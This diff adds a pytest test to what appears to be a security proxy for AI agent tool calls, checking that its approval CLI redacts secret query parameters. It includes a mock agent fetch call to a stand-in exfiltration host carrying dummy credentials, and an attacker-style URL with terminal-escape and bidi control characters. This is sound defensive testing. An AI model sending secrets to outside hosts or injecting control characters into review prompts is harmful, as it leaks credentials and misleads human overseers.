@@ -570,3 +570,119 @@ def test_approve_cli_prompt_sanitization_and_hardening(
     assert item["call_id"] == "call-hostile-1"
     assert "write_file" in item["tool"]
     assert "sandbox/" in item["args"]["path"]
+
+
+def test_approve_cli_url_query_parameter_redaction_every_prompt_line(
+    tmp_path: Path, capsys: pytest.CaptureFixture[str]
+) -> None:
+    """Prove existing redaction rules + sensitive query parameters (token, key, secret, password,
+
+    authorization, api_key, sig) are redacted across Destination, Taint source URL, Args, and --json.
+    """
+    import json
+
+    approval_log = tmp_path / "pending_url_redact.jsonl"
+    audit_log = tmp_path / "audit_url_redact.jsonl"
+
+    taint_src_url = (
+        "https://attacker.example.com/feed\x1b[2J\u202e\x00"
+        "?token=t_val_999&key=k_val_888&secret=s_val_777&safe_param=keep_me"
+    )
+    audit_event = {
+        "schema_version": 1,
+        "event_type": "tool_call",
+        "timestamp": "2026-11-25T09:00:00.000Z",
+        "seq": 1,
+        "session_id": "sess-url-redact",
+        "call_id": "call-prior-taint",
+        "server": "fetch",
+        "tool": "fetch",
+        "args": {"url": taint_src_url},
+        "decision": "allow",
+        "effective_decision": "forwarded",
+        "decision_layer": "policy",
+        "decision_reason": "allowed",
+        "taint_before": [],
+        "taint_after": ["untrusted_content"],
+        "pin_status": "pinned",
+        "latency_ms": {"proxy": 1.0, "upstream": 2.0},
+    }
+    audit_log.write_text(json.dumps(audit_event) + "\n", encoding="utf-8")
+
+    egress_url = (
+        "https://exfil.example.com/drop"
+        "?password=pw_val_666&authorization=Bearer_val_555&api_key=ak_val_444&sig=sig_val_333&ok=1"
+    )
+    embedded_url_note = "Check https://mirror.example.com/dl?token=emb_tok_222&KEY=emb_key_111"
+
+    manager = ApprovalManager(log_path=approval_log)
+    manager.request_approval(
+        call_id="call-url-redact-1",
+        session_id="sess-url-redact",
+        agent_id="agent-eval",
+        server="fetch",
+        tool="fetch",
+        args={
+            "url": egress_url,
+            "note": embedded_url_note,
+        },
+        capabilities=["network_read", "egress"],
+        taint_state=["untrusted_content"],
+        rule_id="deny-untrusted-egress",
+        timeout_seconds=120.0,
+    )
+
+    secret_values = [
+        "t_val_999",
+        "k_val_888",
+        "s_val_777",
+        "pw_val_666",
+        "Bearer_val_555",
+        "ak_val_444",
+        "sig_val_333",
+        "emb_tok_222",
+        "emb_key_111",
+    ]
+
+    # 1. Human text mode
+    rc_text = approve_cli_main(["list", "--log", str(approval_log), "--audit-log", str(audit_log)])
+    assert rc_text == 0
+    out = capsys.readouterr().out
+
+    for secret in secret_values:
+        assert secret not in out, f"Leaked query secret {secret} in prompt text!"
+
+    # Non-sensitive params remain visible and sanitized control chars remain escaped
+    assert "safe_param=keep_me" in out
+    assert "ok=1" in out
+    assert r"\x1b[2J" in out
+    assert r"\u202e" in out
+    assert r"\x00" in out
+    assert "[REDACTED]" in out
+
+    # Explicitly check Destination line, Taint line, and Args line all contain [REDACTED]
+    dest_line = next(line for line in out.splitlines() if "Destination:" in line)
+    taint_line = next(line for line in out.splitlines() if "Taint:" in line)
+    args_line = next(line for line in out.splitlines() if "Args:" in line)
+    assert "password=[REDACTED]" in dest_line
+    assert "authorization=[REDACTED]" in dest_line
+    assert "api_key=[REDACTED]" in dest_line
+    assert "sig=[REDACTED]" in dest_line
+    assert "token=[REDACTED]" in taint_line
+    assert "key=[REDACTED]" in taint_line
+    assert "secret=[REDACTED]" in taint_line
+    assert "token=[REDACTED]" in args_line
+    assert "KEY=[REDACTED]" in args_line
+
+    # 2. JSON mode remains valid JSON and also redacts query secrets across destination, taint_sources, and args
+    rc_json = approve_cli_main(
+        ["list", "--log", str(approval_log), "--audit-log", str(audit_log), "--json"]
+    )
+    assert rc_json == 0
+    json_out = capsys.readouterr().out
+    parsed = json.loads(json_out)
+    assert len(parsed) == 1
+    for secret in secret_values:
+        assert secret not in json_out, f"Leaked query secret {secret} in --json output!"
+    assert "password=[REDACTED]" in parsed[0]["destination"]
+    assert "token=[REDACTED]" in parsed[0]["taint_sources"]["untrusted_content"][0]
